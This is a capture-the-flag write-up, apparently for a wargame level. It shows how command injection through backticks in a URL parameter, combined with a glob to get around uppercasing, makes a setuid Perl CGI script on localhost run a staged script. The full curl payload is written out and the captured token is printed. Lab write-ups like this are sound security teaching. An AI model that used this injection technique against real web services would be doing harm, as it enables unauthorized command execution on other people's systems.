How to find:
dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout
-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
-r-x------  1 level12 level12  675 Apr  3  2012 .profile

The file level12.pl is a Perl script that listens on port 4646 on localhost. It uses the CGI module to receive parameters from an HTTP request and performs a search in a file called /tmp/xd, looking for a matching key-value pair based on the parameters x and y. If a match is found, it returns ..; if not, it returns a single dot (.).

However, in our case, the file /tmp/xd does not exist, which gives us an opportunity to exploit the server's behavior using a command injection technique.

Command Injection
Since the script converts everything received in x to uppercase, the key is to find a way to execute system commands despite this conversion.

Instead of interacting directly with the missing file, we can exploit the use of backticks (`), which allow shell command execution. By injecting a command into the x parameter, we can execute it on the server.

1. Create a Script to Retrieve the Flag: We first create a file that will run the getflag command and redirect the output to a temporary file: 
    echo "getflag > /tmp/flag" > /tmp/GETFLAG
    chmod +x /tmp/GETFLAG

2. Send the HTTP Request Using curl: We then use curl to send a request to the server, injecting the command via the x parameter using backticks:
    curl 'http://localhost:4646?x=`/*/GETFLAG`'curl

3. Check the Flag: Once the command runs, the output of getflag is stored in /tmp/flag, so we simply use cat to view the contents:
    cat /tmp/flag
    Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr

Conclusion
    This exercise demonstrates how to leverage command injection in an environment where a poorly implemented script allows system commands to be executed. By using backticks to execute a file containing the getflag command, we successfully retrieve the flag indirectly.
